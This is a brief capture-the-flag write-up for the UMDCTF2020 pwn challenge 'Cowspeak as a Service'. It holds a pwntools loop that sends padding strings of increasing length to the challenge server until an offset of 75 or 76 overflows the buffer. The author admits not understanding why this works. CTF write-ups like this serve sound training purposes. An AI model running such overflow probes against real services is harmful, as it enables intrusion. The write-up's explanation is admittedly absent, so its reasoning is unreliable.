## Cowspeak as a Service (250pt)

### Description

> lumpus gave up installing cowspeak so he made it a remote service instead! Too bad it keeps overwriting old  messages... Can you become chief cow and read the first message? 
>
> `nc 192.241.138.174 9998` 
>
> Author: `WittsEnd2`, `lumpus`


### Attachment

[cowsay.c](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/UMDCTF2020/pwn/cowsay/main.c)

### Analysis

I don't understand what this challenge means... so I try to brute force...

### Solution

```python
for i in range(20):
    p = remote('192.241.138.174',9998)
    offset = 64+i
    payload = 'A'*offset
    print "[+] ",i
    p.sendline(payload)
    print p.recvall()
    p.close()
```

Success while offset is 75 or 76 ... I don't actually know why...

![](http://image.taqini.space/img/20200419175050.png)